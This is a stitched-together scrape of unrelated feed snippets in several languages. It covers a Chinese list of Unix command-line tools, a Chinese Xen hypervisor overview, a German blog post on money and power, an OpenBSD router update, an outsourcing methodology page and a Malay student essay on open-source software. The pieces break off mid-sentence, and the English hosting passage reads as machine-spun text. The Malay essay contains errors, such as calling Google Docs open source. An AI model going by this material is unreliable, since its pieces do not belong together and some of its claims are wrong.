por hospedar e bem receber um evento técnico deste nível. Que venha o próximo!  Update: completei a minha apresentação com os códigos e testes utilizados e disponibilizei o PDF no site do OeSC-Livre. As outras apresentações usadas no evento também estão lá.]]></summary>

Earlier than we determine on probably the most compatible operating system for web hosting we have to delve just a little further to know what an operating system is and why is it being given a lot importance. 
What’s an Working System? 
The functions that you can use in your laptop, the internet chatting and shopping dealings are all doable because of the assist of the operating system. Working techniques are the backbone of computers that enable you to in finishing your activity with ease.

  <summary><![CDATA[摘要：下面是Kristf Kovcs收集的28个Unix/Linux下的28个命令行下的工具（原文链接），有一些是大家熟悉的，有一些是非常有用的，有一些是不为人知的。这些工具都非常不错，希望每个人都知道。


下面是Kristóf Kovács收集的28个Unix/Linux下的28个命令行下的工具（原文链接），有一些是大家熟悉的，有一些是非常有用的，有一些是不为人知的。这些工具都非常不错，希望每个人都知道。本篇文章还在Hacker
 News上被讨论，你可以过去看看。 

dstat & sar 

iostat, vmstat, ifstat 三合一的工具，用来查看系统性能。 

官方网站：http://dag.wieers.com/rpm/packages/dstat/ 

你可以这样使用： 

alias dstat='dstat -cdlmnpsy' 

 

slurm 

查看网络流量的一个工具 

官方网站：Simple Linux Utility for Resource Management 

 

vim & emacs 

真正程序员的代码编辑器。 

 

screen, dtach, tmux, byobu 

你是不是经常需要 SSH 或者 telent 远程登录到 Linux 服务器？你是不是经常为一些长时间运行的任务而头疼，比如系统备份、ftp 传输等等。通常情况下我们都是为每一个这样的任务开一个远程终端窗口，因为他们执行的时间太长了。必须等待它执行完毕，在此期间可不能关掉窗口或者断开连接，否则这个任务就会被杀掉，一切半途而废了。 

screen是一个可以在多个进程之间多路复用一个物理终端的窗口管理器。screen中有会话的概念，用户可以在一个screen会话中创建多个screen窗口，在每一个screen窗口中就像操作一个真实的telnet/SSH连接窗口那样。请参看IBM DeveloperWorks的这篇文章《使用
 screen 管理你的远程会话》 

 

dtach 是用来模拟screen的detach的功能的小工具，其可以让你随意地attach到各种会话上 。下图为dtach+dvtm的样子。 

 

tmux是一个优秀的终端复用软件，类似GNU Screen，但来自于OpenBSD，采用BSD授权。使用它最直观的好处就是，通过一个终端登录远程主机并运行tmux后，在其中可以开启多个控制台而无需再“浪费”多余的终端来连接这台远程主机；当然其功能远不止于此。与screen相比的优点：可以横向和纵向分割窗口，且窗格可以自由移动和调整大小。可在多个缓冲区进行复制和粘贴，支持跨窗口搜索；非正常断线后不需重新detach；……
  有人说——与tmux相比，screen简直弱爆了。 

 

byobu是Ubuntu开发的，在Screen的基础上进行包装，使其更加易用的一个工具。最新的Byobu，已经是基于Tmux作为后端了。可通过“byobu-tmux”这个命令行前端来接受各种与tmux一模一样的参数来控制它。Byobu的细节做的非常好，效果图如下： 

 

  

multitail 

multiTail是个用来实现同时监控多个文档、类似tail命令的功能的软件。他和tail的区别就是他会在控制台中打开多个窗口，这样使同时监控多个日志文档成为可能。他还可以看log文件的统计，合并log文件，过滤log文件，分屏，……。 

官网：http://www.vanheusden.com/multitail/ 

 

tpp 

终端下的PPT，要是在某某大会上用这个演示PPT，就太TMD的Geek了。 

官网：http://www.ngolde.de/tpp.html 

 

xargs & parallel 

Executes tasks from input (even multithread). 

xargs 是一个比较古老的命令，有简单的并行功能，这个不说了。对于GNU parallel(online
 manpage)来说，它不仅能够处理本机上多执行绪，还能分散至远端电脑协助处理。而使用GNU parallel前，要先确定本机有安装GNU parallel/ssh/rsync，远端电脑也要安装ssh。 

 

duplicity & rsyncrypto 

duplicity是使用rsync算法加密的高效率备份软件，Duplicity支持目录加密生产和格式上传到远程或本地文件服务器。 

rsyncrypto 就是 rsync + encryption。 

Encrypting backup tools. 

 

nethack & slash'em 

netHack（Wiki），20年历史的古老电脑游戏。没有声音，没有漂亮的界面，不过这个游戏真的很有意思。网上有个家伙说：如果你一生只做一件事情，那么玩NetHack。这句话很惹眼，但也让人觉得这个游戏很复杂不容易上手。其实，这个游戏很虽然很复杂，却容易上手。虽然玩通关很难，但上手很容易。NetHack上有许多复杂的规则，”the
 DevTeam thinks of everything”（开发团队想到了所有的事情)。各种各样的怪物，各种各样的武器….，有许多spoilers文件来说明其规则。除了每次开始随机生成的地图，每次玩游戏，你也都会碰到奇怪的事情: 因为喝了一种药水，变成了机器人;因为踢坏了商店的门被要求高价赔偿;你的狗为你偷来了商店的东西….. 这有点象人生，你不能完全了解这个世界，但你仍然可以选择自己的面对方式。 

网上有许多文章所这是最好的电脑游戏或最好的电脑游戏之一。也许是因为它开放的源代码让人赞赏，古老的历史让人宽容，复杂的规则让人敬畏。虽然它不是当前流行的游戏，但它比任何一个当前流行的游戏都更有可能再经受20年的考验。 

Slash'EM 也是一个基于NetHack的经典游戏。 

 

lftp 

利用lftp命令行ftp工具进行网站数据的增量备份，镜像，就像使用rsync一样。 

 

ack 

ack是一个perl脚本，是grep的一个可选替换品。其可以对匹配字符有高亮显示。是为程序员专门设计的，默认递归搜索，省提供多种文件类型供选。 

 

calcurse & remind + wyrd 

calcurse是一个命令行下的日历和日程软件。remind + wyrd也很类似。关于日历，我不得不提一个Linux的Cycle日历，也是一个神器，呵呵。 

 

newsbeuter & rsstail 

newsbeuter 和 rsstail 是命令行下RSS的阅读工具。 

 

powertop 

做个环保的程序员，看看自己的电脑里哪些程序费电。powerTOP 是一个让 Intel 平台的笔记本电脑节省电源的 Linux 工具。此工具由 Intel 公司发布。它可以帮助用户找出那些耗电量大的程序，通过修复或者关闭那些应用程序或进程，从而为用户节省电源。 

 

htop & iotop 

htop 和 iotop用来查看进程，内存和IO负载。 

 

ttyrec & ipbt 

ttyrec是一个 tty 控制台录制程序，其所录制的数据文件可以使用与之配套的 ttyplay 播放。不管是你在 tty 中的各种操作，还是在 tty 中耳熟能详的软件，都可进行录制。 

ipbt是一个用来回放 ttyrec 所录制的控制台输入过程的工具。 

与此类似的还有Shelr和termrec  

 

rsync 

通过SSH进行文件同步的经典工具 

 

mtr 

MTR – traceroute 2.0，其是把 traceroute 和 ping 集成在一块的一个小工具 用于诊断网络。 

 

socat & netpipes 

socat是一个多功能的网络工具，名字来由是” Socket CAT”，可以看作是netcat的N倍加强版。 

netpipes 和socat一样，主要是用来在命令行来进行socket操作的命令，这样你就可以在Shell脚本下行进socket网络通讯了。 

 

 

iftop & iptraf 

iftop和iptraf可以用来查看当前网络链接的一些流量情况。 

 

siege & tsung 

siege是一个压力测试和评测工具，设计用于WEB开发这评估应用在压力下的承受能力：可以根据配置对一个WEB站点进行多用户的并发访问，记录每个用户所有请求过程的相应时间，并在一定数量的并发访问下重复进行。 

Tsung是一个压力测试工具，可以测试包括HTTP, WebDAV, PostgreSQL, MySQL, LDAP, and XMPP/Jabber等服务器。针对 HTTP 测试，Tsung 支持 HTTP 1.0/1.1 ，包含一个代理模式的会话记录、支持 GET、POST 和
 PUT 以及 DELETE 方法，支持 Cookie 和基本的 WWW 认证，同时还支持 SSL。

下图是TaskWarrior 2.0的界面： 

 

curl 

cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。cURL还包含了用于程序开发的libcurl。cURL支援的通訊協定有FTP、FTPS、HTTP、HTTPS、TFTP、SFTP、Gopher、SCP、Telnet、DICT、FILE、LDAP、LDAPS、IMAP、POP3、SMTP和RTSP。 

 

rtorrent & aria2 

rTorrent 是一个非常简洁、优秀、非常轻量的BT客户端. 它使用了 ncurses 库以 C++ 编写, 因此它完全基于文本并在终端中运行. 将 rTorrent 用在安装有 GNU Screen 和 Secure Shell 的低端系统上作为远程的 BT 客户端是非常理想的。 

aria2 是 Linux 下一个不错的高速下载工具。由于它具有分段下载引擎，所以支持从多个地址或者从一个地址的多个连接来下载同一个文件。这样自然就大大加快了文件的下载速度。aria2 也具有断点续传功能，这使你随时能够恢复已经中断的文件下载。除了支持一般的 http(s) 和 ftp 协议外，aria2
 还支持 BitTorrent 协议。这意味着，你也可以使用 aria2 来下载 torrent 文件。 

 

ttytter & earthquake 

TTYtter 是一个Perl写的命令行上发Twitter的工具，可以进行所有其他平台客户端能进行的事情，当然，支持中文。脚本控、CLI控、终端控、Perl控的最愛。

  <title><![CDATA[Vorstellung und Mythen]]></title>
  <summary><![CDATA[Liebe Leser, für meine kommenden Beiträge möchte ich Ihnen einige Akteure vorstellen.  Das ist B S G J (Bill Steve Gate Jobs) Gründer einer Softwarefirma vor ca 40 Jahren. Monatlicher Reingewinn dieser Firma ungefährt 500 000 000 GE.  Dann haben wir noch Pechvogel Glübi. Gründer einer Firma für die Herstellung von Glühbirnen (glücklicherweise auch anderen Lampenvarianten)  Wir haben noch den G. F. A (Glühe für Atom). Gründer eines Energieriesen der hauptsächlich auf AKW setzte (glücklicherweise aber auch andere Kraftwerke betreibt)  Dann haben wir N.N. (Normal Normalo) arbeitet (noch) in der freien Wirtschaft, verdient etwa 3000 Brutto /Monat.  Dann haben wir B.B (Beamto Beamter) arbeitet sein bisheriges Leben nur für den Staat.  Dann haben wir A.G (Arnold Geschick) ein Tausendsassa, hat da er in Deutschland lebt folgende Meisterehren erlangt, Schreiner, Klempner, Metallbauer, Mechtroniker, Elektroniker, Maurer.  Wenn es um eine handwerkliche Lösung geht kann er alles. Besonderheit: arbeitet nur 2 Stunden/Tag für Kunden....  Und wir haben da noch A. B (Angie Bundeskanzler) Chef einer alteingesessenen Partei führt im Augenblick die Bundesregierung. Verdient etwa 500 000 G / Jahr.  Weiterhin U.S. (Unterschicht), nicht viel gelernt, Schule kurz vor dem Abschluß hingeworfen, findet das Ihm Unrecht getan wurde/wird.    Etwaige Namensähnlichkeiten sind nicht zufällig ;-)  Warum stelle ich Ihnen diese fiktiv realen Personen vor? Nun ich finde es etwas netter wenn man gewisse Mython an der Realität fest machen kann.  Heute geht es mir speziell um ein Mythos: "Geld regiert die Welt". Nun erst einmal bietet dieser Ausdruck viel "Potential". Betrachten wir einfach mal was "übrig" bleibt.  Ich denke, man kann BSGJ in dieser Geld regiert die Welt Welt ganz nach oben setzen. Bei Glübi wird es schon schwierig und Normale ist halt "einfach" normal. Bei A.B. kann man wohl von "über" Durchschnitt reden.  Nehmen wir es ganz konkret (Geld regiert die Welt) dann dürfte der Einflus ungefähr so verlaufen 1) BSGK 2-3 Glübi und G.F.A. 4) AB 5-6 N.N; B.B 7) A G 8) U.S.  Nun betrachten wir mal einige Szenarien: - Einfluss auf das persönlche Leben jedes Einzelnen  Nun ohne Zweifel hat BSGK hier Maßstäbe gesetzt. Nur wissen wir auch neben Windows OS and Mac OS gibt es noch (unvollständig: Linux. BSD-Derivate (FreeBSD, OpenBSD), Solaris, HP-Unix, Mainframe OSes, AiX, PalmOS, IOs etc etc)  NN hat die Wahl möchte er BSGKS Zeug benutzen oder nicht? BSGK kann hier gar nichts machen.  Schauen wir mal die Wahlmöglichkeiten von NN an wenn es um sein persönliches Alter/Wohlbefinden geht. Schauen wir mal A.B. findet in Ihrer Regierung die Mehrheit die Arbeitslosenversicherung auf 20 % zu setzen. Welche Wahl hat N.N? In der Tat keine. Wenn doch Geld die Welt regierte müsste N.N. doch hier anders entscheiden können. Kann er nicht.  Damit haben wird diesen Mythos mit nur wenigen Akteuren widerlegt. Die Welt wird nicht von Geld regiert, sondern in weiten Teilen von den "Lenkern" der Länder. Ja innerhalb eines Landes hat Geld noch eine Wahl aber eben nicht "die" Wahl. Gewisse Dinge müssen bezahlt werden ohne das dem eine Gegenleistung gegenüber stünde.  Wir können ruhig den Extremfall Glühbi anschauen. Glühbi produzierte etwas, was die Leute 100 Jahre benutzten, ohne großen "Aufwand" und ohne große Nachwirkungen. Ein Glühbirne ist vom Materialeinsatz her wirklich "genügsam". Die Leute haben auch immer Glühbirnen gekauft. Nur als es AB und Konsorten gefiel, war es aus mit Glühbirnen. Dafür gab es keinen Grund nur offensichtlich hatten die Regierenden etwas dagegen. Der Mythos von Geld regiert die Welt ist in dieser Form unhaltbar.  Nun es gibt natürlich Möglichkeiten für Leute mit Geld Einfluss zu nehmen. Das will ich nicht bestreiten. Und speziell weil auch die Reichen wissen, wer die Gesetze macht ist Lobbyismus natürlich "naheliegend".  Nur kann man diese Lobby betreiben wie man will, entschieden wird im Parlament und nichts und niemand kann dort vorhersagen wie es kommen mag.  Insgesamt kann man in D sagen, es wird von den Parteien regiert. Und dort natürlich nicht von den "normalen" Mitgliedern sondern von denen in besonderen Positionen. Die Interessen von diesen und dem was das Geld "machte" (wenn man es mal so lapidar formuliert)  können in die gleiche Richtung gehen aber auch völlig diametral entgegengesetzt sein. Fragen Sie Glühbi oder G.F.A., sie können sogar N.N. oder B.B. fragen. Je nach Indoktrinierungsgrad werden Sie verschiedene Antworten bekommen.....]]></summary>

Xen 是一种类型 1 虚拟机管理程序，它创建系统资源的逻辑池，使许多虚拟机可共享相同的物理资源。 

Xen 是一个直接在系统硬件上运行的虚拟机管理程序。Xen 在系统硬件与虚拟机之间插入一个虚拟化层，将系统硬件转换为一个逻辑计算资源池，Xen 可将其中的资源动态地分配给任何操作系统或应用程序。在虚拟机中运行的操作系统能够与虚拟资源交互，就好象它们是物理资源一样。 

图 1 显示了一个运行虚拟机的 Xen 系统。 
 
图 1. Xen 架构 
  


Xen 运行 3 个虚拟机。每个虚拟机与其他虚拟机都独自运行一个来宾操作系统和应用程序，同时共享相同的物理资源。 

功能 

以下是 Xen 架构的关键概念： 


完整虚拟化。
Xen 可运行多个来宾 OS，每个 OS 在其自己的 VM 上运行。
无需驱动程序，许多出色的功能在 Xen 后台程序 xend 中进行。

完整虚拟化 

大部分虚拟机管理程序基于完整虚拟化，这意味着它们向虚拟机完整地模拟所有硬件设备。来宾操作系统不需要任何修改，它们的行为就好象它们每一个都可以独占访问整个系统。 


半虚拟化


半虚拟化是一种虚拟化技术，它向虚拟机提供一个软件接口，这个软件接口类似但不等同于底层硬件的接口。这个经过修改的接口用于减少来宾操作系统执行某些操作所花费的时间，相对于非虚拟化的环境，这些操作在虚拟环境中的运行困难得多。 

有一些专门定义的 “挂钩” 允许来宾和宿主请求和接受这些困难的任务，这些任务也可以在虚拟域中执行，但执行性能更低。 



完整虚拟化常常具有性能缺陷，因为完整的模拟通常需要虚拟机管理程序的更多处理资源（和更多开销）。Xen 基于半虚拟化，它要求修改来宾操作系统来支持 Xen 操作环境。但是，用户空间应用程序和库不需要修改。 

出于以下原因，必须进行操作系统修改： 


为了使 Xen 能够将操作系统设置为最高特权的软件。
为了使 Xen 能够使用更有效的接口（比如虚拟块设备和虚拟网络接口）来模拟设备，这会提高性能。

Xen 可运行多个来宾 OS，每个 OS 在自己的 VM 上运行 

Xen 可运行多个来宾操作系统，每个操作系统在自己的虚拟机或域中运行。在首次安装 Xen 时，它会自动创建第一个域 Domain 0（或 dom0）。 

Domain 0 是管理域，负责管理系统。它执行构建其他域（或虚拟机）、管理每个虚拟机的虚拟设备，暂停虚拟机、恢复虚拟机和迁移虚拟机等任务。Domain 0 运行一个来宾操作系统，负责管理硬件设备。 

无需驱动程序，许多出色的功能即可在 Xen 后台程序中执行 

Xen 后台程序 xend 是一个 Python 程序，在 dom0 中运行。它是一个中央控制点，管理在 Xen 虚拟机管理程序上运行的所有虚拟机的虚拟资源。大部分命令解析、验证和排序操作是在 Xend 的用户空间中执行，不是在驱动程序中执行。 

IBM 服务器支持 Xen 的 SUSE Linux Enterprise Edition (SLES) 10 版本，后者支持以下配置： 


每个处理器 4 个虚拟机，每个物理系统最多 64 个虚拟机。
SLES 10 来宾操作系统（仅半虚拟化）。

部署虚拟化 

要部署 Xen 虚拟化，请执行以下步骤： 


在系统上安装 Xen。
创建和配置虚拟机（这包括来宾操作系统）。

使用以下一种方法安装 Xen 软件： 


交互式安装：使用此方法直接将 Xen 软件安装在 Xen 服务器上的专用虚拟机上。这个专用的虚拟机在安装过程中称为客户端计算机。
从 CommCell 控制台安装：使用此方法将 Xen 软件远程安装在 Xen 服务器上的专用虚拟机上。

  

管理您的虚拟机 

有一些可用的虚拟机管理器，包括： 


开源管理器：


OpenXenManager，Citrix 的 XenServer XenCenter 的一个开源克隆，管理 XCP 和 Citrix 的 XenServer。
Xen Cloud Control System (XCCS) 是优秀的 Xen Cloud Platform 云计算系统的一个轻量型前端程序包。
Zentific，一个基于 Web 的管理接口，用于有效控制在 Xen 虚拟机管理程序上运行的虚拟机。

商业管理器：


Convirture：ConVirt 是一个集中化管理解决方案，允许您配置、监控和管理您的 Xen 部署的完整生命周期。
Citrix XenCenter 是一个 Windows 原生的图形用户界面，用于管理 Citrix XenServer 和 XCP。
Versiera 是一种基于 Web 的 Internet 技术，设计用于安全地管理和监控云环境和企业，支持 Linux、FreeBSD、OpenBSD、NetBSD、OS X、Windows、Solaris、OpenWRT 和 DD-WRT。


选择 Xen 

优点： 


Xen 服务器构建于开源的 Xen 虚拟机管理程序之上，结合使用半虚拟化和硬件协助的虚拟化。OS 与虚拟化平台之间的这种协作支持开发一个较简单的虚拟机管理程序来提供高度优化的性能。
Xen 提供了复杂的工作负载平衡功能，可捕获 CPU、内存、磁盘 I/O 和网络 I/O 数据，它提供了两种优化模式：一种针对性能，另一种针对密度。
Xen 服务器利用一种名为 Citrix Storage Link 的独特的存储集成功能。使用 Citrix Storage Link，系统管理员可直接利用来自 HP、Dell Equal Logic、NetApp、EMC 等公司的存储产品。
Xen 服务器包含多核处理器支持、实时迁移、物理服务器到虚拟机转换 (P2V) 和虚拟到虚拟转换 (V2V) 工具，集中化的多服务器管理、实时性能监控，以及 Windows 和 Linux 的快速性能。

缺点： 


Xen 会占用相对较大的空间，且依赖于 dom0 中的 Linux。
Xen 依靠第三方解决方案来管理硬件设备驱动程序、存储、备份和恢复，以及容错。
任何具有高 I/O 速率的操作或任何会吞噬资源的操作会使 Xen 陷入困境，使其他 VM 缺乏资源。
Xen 的集成可能存在问题，它可能逐渐成为您的 Linux 内核上的负担。
XenServer 5 缺少 802.1Q 虚拟局域网 (VLAN) 中继；因为出于安全考虑，它没有提供目录服务集成、基于角色的访问控制、安全日志记录和审计或管理操作。

  <title><![CDATA[2X firewall performance on HSR]]></title>
  <summary><![CDATA[While waiting for OpenBSD 5.2 to be officially released, we’ll be releasing another security router (SR) update based on our current OpenBSD version, but with various improvements. 
One of them is a rather interesting patch that has been floating around for some time, could nearly double the raw forwarding (routing) performance. 
The patch was developed and tweaked by no fewer than OpenBSD’s Mike Belopuhov, David Gwynne, Henning Brauer, Theo de Raadt and Thordur Bjornson. The patch, which was commited as http://www.openbsd.org/cgi-bin/cvsweb/src/sys/netinet/ip_input.c.diff?r1… could nearly double the raw forwarding (routing) performance. We’ve found that the HSR-100X (which performance is CPU bound) increased it’s routing (non-NAT) performance from around 400 Mbps to a whopping 800 Mbps. Pretty impressive. 
The update will be released as 3.0-cookie-p22 in a near future.

METHODOLOGY At  AERL'S,  a  standardized  software  development  methodology  helps  us  to  provide  very  cost- effective  and  efficient  business  solutions.  The  following  would  give  a  better  understanding  of  the  same:   PHASE 1- REQUIREMENTS GATHERING  Our Business Consultants conducts Joint Application Development sessions with the client. These  are brainstorming sessions that help determine the business objectives and marketing goals.  Prototype storyboards or screen layouts are used for role-playing.    PHASE 2 -TECHNICAL ARCHITECTURE  Our Technical Architects advise the client on options available to him with respect to architectural  approaches and technology solutions for project implementation.    PHASE 3 - CONFIRMATION  Based on the architecture and technology chosen, the development team of Programmers, graphic  designers and project managers draft a development plan for the project with cost and time  estimates.  PHASE 4 - INCREMENTAL DEVELOPMENT  This is the stage where the project is actually off the ground. AERL'S builds the application in  progressive phases or increments. Incremental delivery permits experimentation of complex  solutions during the course of development. This approach facilitates modifications through hands- on exposure to the delivered increment.  PHASE 5 - INSTALLATION and TRAINING  Once the system is installed on the production servers, comprehensive training is extended to the  client's IT/ MIS personnel; not only to administer and maintain it, but also to understand the  underlying technology and development tools. The end-users are trained to use the application  effectively. Follow-up action in terms of close monitoring of the system and applications ensures  immediate response to issues     Some Additional Notes     Communication  is of  high  profile for a  successful  development  that  is  why  we  usually  have  two project managers assigned to the project. One of them, either a member of our team or  your representative, is a local Project Manager who closely works with your team to ensure  seamless  information  exchange  and  monitors  the  progress.  The  other  one,  the  offshore  Project Manager, is fully assigned to your project and is fully responsible for it.     The Internet will undoubtedly be used for effective communication and on-time deliveries. We  also use special techniques and tools to support remote development. Our programmers and  other  specialists  effectively  work  as  a  team  despite  the  fact  that  they  are  in  different  geographic locations.     If  it  is  necessary,  qualified  technical  consultant  can  be  assigned  to  study  your  business  process  and  your  existing  software.  Of  course,  we  understand  all  the  complexity  of  the  development process, great variety of possible situations and requirements, individual sense  of taste and other things. We will take whatever time is necessary to meet your expectations.  This development process allows us to guarantee:   On-time completion of the project.   Delivery of a high-quality system meeting your business requirements.   Development of a flexible, easy to use and modify (in case you need some enhancements in  future) system.

  <title><![CDATA[# Refleksi minggu 5 #]]></title>
  <summary><![CDATA[Assalamualaikum dan salam sejahtera:) Alhamdulilah..kita masih diberi kesempatan untuk berjumpa sekali lagi pada minggu ini. Pada minggu ini, tiada tugasan yang terbaru diberikan.Kami hanya perlu menyiapkan tugasan minggu lepas dengan teratur dan lebih kemas. Saya dan ahli kumpulan masih lagi di dalam proses mencari bahan tugasan iaitu perisian sumber terbuka. Alhamdulilah, dengan kerjasama yang diberi oleh ahli kumpulan, akhirnya kami berjaya menyiapkan tugasan perisian sumber terbuka dengan jayanya.    DEFINISI PERISIAN SUMBER TERBUKA Perisian sumber terbuka merujuk kepada perisian sumber bebas yang mempunyai kod. Pada dasarnya, akses terbuka kod sumber memberi manfaat kepada pengguna kerana ia boleh mengubah dan menyesuaikan perisian untuk lebih memenuhi keperluan mereka. Kod sumber dan hak-hak tertentu lain yang biasanya dikhaskan untuk pemegang hak cipta yang diperuntukkan di bawah lesen sumber terbuka yang membenarka pengguna untuk mengkaji, mengubah, memperbaiki serta mengedarkan perisian. Perisian sumber terbuka juga membenarkan kita menggunakan tanpa membayar sebarang lesen kepada pencipta aplikasinya. Perkembangan perisian sumber terbuka seiring dengan perkembangan modenisasi kerana ianya sangat perlu dan penting dalam kehidupan kita. Penggunaannya juga dijamin selamat. Di samping itu juga, pengguna perisian sumber terbuka boleh mempakej perisian semula versi sendiri dan menjualnya mengikut syarat-syarat tertentu. Antara perisian sumber terbuka yang mendapat perhatian orang ramai seperti kernel Linux, Apache web server, sistem pangkalan data mySQL, web pelayar MOZILLA dan sebagainya. Menurut Raymond ( 2001 ) dan O’Reilly ( 1999 ) menyatakan bahawa peguambela perisian sumber terbuka telah berhujah dengan mangatakan bahawa perisian sumber terbuka boleh menigkatkan kualiti produk perisian serta menggalakkan evolusi dan inovasi perisian. Selain itu, pada 12 September 2003, Inisiatif Sumber Terbuka mengekalkan definisi perisian sumber terbuka yang mana mempunyai 9 fasal. Fasal pertama adalah perisian mesti diedarkan secara percuma tanpa memerlukan royalti atau fi untuk dijual. Fasal kedua pula ialah mengenai kod program, kod program mesti ada dan mudah didapati (sebagai contoh, boleh dimuat turun dari laman web) dalam bentuk yang membolehkan pengaturcara untuk mengubah suai program. Manakala, fasal ketiga tentang pengubahsuaian. Kerja-kerja yang diperolehi boleh diberi pengubahsuaian tetapi ia mesti dapat diagihkan di bawah terma yang sama seperti perisian yang asal. Fasal seterusnya ialah integriti kod sumber asal mesti dapat dikekalkan sama ada memerlukan pengubahsuaian untuk diagihkan sebagai ‘’fail patch’’ atau diubahsuai versi yang berlainan dari segi nama atau nombor. Fasal seterusnya ialah mesti ada diskriminasi terhadap orang atau kumpulan. Kemudian, fasal keenam mesti ada diskriminasi terhadap mana-mana bidang yang diceburi. Fasal ketujuh adalah lesen baharu perlu dipohon dengan pihak berkenaan tanpa memerlukan bersetuju dengan lesen lain. Fasal kelapan adalah lesen mestilah tidak khusus kepada produk tertentu atau pengedaran. Fasal yang terakhir adalah lesen tidak perlu memohon dengan perisian lain yang diedarkan bersama-sama program open source initiative (2003).              Kebaikan dan kelemahan perisian sumber terbukaPerisian sumber terbuka juga mempunyai kelebihan dan kelemahan yang tersendiri. Antara kelebihannya adalah kod sumber disediakan untuk pengguna dan mereka mempunyai hak untuk mengubah suai kod tersebut. Memandangkan, perisian sumber terbuka adalah perisian yang percuman, ia menybabkan peningkatan kepada penggunaan perisian tanpa perlu melabur wang yang banyak dalam proses perkembangan dari segi penyelidikan, pembangunan dan sebagainya. Kod sumber yang diubahsuai dan diperbaiki boleh bebas diulang. Ianya menjadi mesra pengguna kepada masyarakat. Selain itu, melalui perisian sumber terbuka mewujudkan kekerapan intergarsi. Hal ini kerana, perubahan kod harus bersepadu (digabungkan ke dalam pangkalan kod) sekerap mungkin supaya dapat mengelakkan overhed. Perisian sumber terbuka juga mempunyai ahli komuniti sumber terbuka yang boleh memberi maklum balas segera terhadap kod perisian yang ditulis oleh orang lain kerana mereka semua mempunyai akses kepada kod sumber dan boleh mengemukakan patch kod. Selain daripada kebaikan, perisian sumber terbuka juga mempunyai kelemahan. Antaranya adalah kod terlalu rumit untuk pengguna novis memahaminya. Selain itu, tiada individu rasmi tertentu untuk memantau kerja pengaturcara memperbaiki kod. Hal ini kerana sesiapa sahaja bebas untuk menggunakan, mengubahsuai atau mengedarkan kod. Di dalam dunia perniagaan pula, pengguna mesti memahami logaik perniagaan untuk menyesuaikan konfigurasi atau membuat pelaran kod untuk memenuhi aliran kerja yang unik dan memenuhi keperluan klinikal. Pengguna juga mesti selalu berwaspada terhadap amaran bahaya dan kandungan yang sarat dengan maklumat.              Contoh perisian sumber terbuka Terdapat beberapa contoh perisian sumber terbuka yang terkenal. Antaranya ialah linux. Linux adalah sistem operasi komputer dan asalnya sebagai sistem UNIX yang sedia ada dalam banyak versi. Dewasa kini, Linux adalah sistem UNIX yang lengkap di mana boleh digunakan untuk jaringan. Selain itu, ggogle docs juga merupakan perisian sumber terbuka. Ianya berfungsi untuki menyimpan, mengolah, mengedit dokuman seperti fungsi microsoft word tetapi ia hanya boleh digunakan secara atas talian. Seterusnya ialah KDE iaitu suatu persekitaran perkembangan dekstop. GNOME juga contoh perisian sumber terbuka yang melibatkan persekitaran perkembangan dekstop untuk membangunkan dekstop serta ianya boleh diaplikasi dalam dekstop sendiri. Apache merupakan contoh perisian sumber terbuka di mana merupakan program pelayan web yang digunakan dalam kebanyak komputer pelayan web dan boleh didapati untuk windows serta Linux. Firefox adalah satu klien web program yang boleh didapati untuk windows dan Mac serta Linux dan lain-lain sistem UNIX. Dovecot juga adalah program pelayan e-mel yang berfungsi untuk menghantar dan menerima emel yang menyokong POP3 dan IMAP yang boleh didapati untuk Linux. Manakala, Squirrel Mail satu aplikasi emel untuk membaca dan menulis e-mel melalui program klien. Contoh seterusnya ialah Postfix suatu program pelayan e-mel digunakan untuk menghantar dan menerima e-mel.  TUJUAN PERISIAN SUMBER TERBUKA Perisian sumber terbuka dijalankan bagi memberi kebebasan kepada pengguna untuk menjalankan apa sahaja program. Pengguna perlu bebas untuk mempelajari bagaimana sesuatu program beroperasi serta sesuai dengan kebolehan diri sendiri. Pengguna juga perlu mempelajari mengakses kod program. Di samping itu, perisian sumber terbuka adalah satu perisian yang diedarkan secara percuma. Jadi, kita tidak perlu risau tentang lesen. Ianya berlainan dengan penggunaan microsoft. Untuk menggunakan microsoft kita perlu membelinya terlebih dahulu. Walaupun begitu, ada juga perisian sumber terbuka yang perlu dibeli untuk digunakan. Antaranya ialah operasi linux tetapi harganya tidak terlalu mahal dan berpatutan.             Kita perlu menggunakan perisian sumber terbuka kerana melalui penggunaannya, kita akan menjadi lebih kreatif dan inovatif. Hal ini kerana, kita boleh belajar bagaimana mencipta perisian atau mengubah perisian supaya ia menjadi satu perisian yang lebih baik. Kita juga boleh berada sama taraf dengan produk syarikat gergasi seperti microsoft walaupun hanya menggunakan perisian sumber terbuka. Dengan menggunakan perisian sumber terbuka juga, kita boleh menyimpan wang kerana ia tidak memerlukan sebarang belanja apabila ingin menggunakannya. Kita hanya pelru memuat turun ia pada komputer melalui internet. Tetapi jika kita menggunakan produk dari microsoft atau sesuatu perisian yang mempunyai undang-undang, kita perlu menghabiskan banyak wang kerana perisian tersebut perlu dibeli seperti Microsoft.             Selain itu, melalui perisan sumber terbuka juga kita boleh meningkatkan imej negara. Hal ini kerana, melalui perisian sumber terbuka, pengguna tidak perlu terlibat dengan membeli sebarang barangan cetak rompak. Barangan cetak rompak akan menjejaskan imej negara dan akan dipandang hina oleh negara lain. Kebiasannya, masyarakat kita ingin membeli sesuatu yang murah dan senang didiapati. Oleh itu, langkah terbaik mereka membeli cerita cetak rompak kerana mereke beranggapan bahawa cetak rompak dan original tiada beza. Dengan adanya perisian sumber terbuka, mereka boleh memuat turun cerita yang ingin ditonton tanpa perlu membayarnya. SEJARAH PENUBUHAN PERISIAN SUMBER TERBUKA Keadaan Awal perkongsian bebas kod sumber termasuk sumber IBM siaran sistem operasi dan program-program lain dalam tahun 1950-an dan 1960-an, dan kumpulan SAHAM pengguna yang ditubuhkan untuk memudahkan pertukaran perisian. Dalam ciri bayangan Internet, perisian dengan kod sumber termasuk menjadi persediaan pada rangkaian BBS pada 1980-an. Ini kadang-kadang merupakan satu keperluan mengedarkan perisian yang ditulis dalam bahasa ditafsirkan ASAS dan lain-lain.Ia hanya boleh diagihkan sebagai kod sumber kerana tiada tingkahlaku perduaan berasingan mudah alih untuk mengedarkan.Selain itu, sumber terbuka dirujuk kepada teknik standard  kewartawanan perhimpunan berita dan memeriksa fakta dan mencerminkan satu istilah yang serupa yang digunakan dari tahun 1992 di kalangan perisikan tentera, perisikan sumber terbuka. Ia kini biasa digunakan untuk menggambarkan bentuk penerbitan inovatif kewartawanan dalam talian dan bukannya sumber berita oleh wartawan profesional. Pada 25 Disember, 2006 isu majalah TIME ini disebut sebagai pengguna mencipta kandungan dan disenaraikan di samping 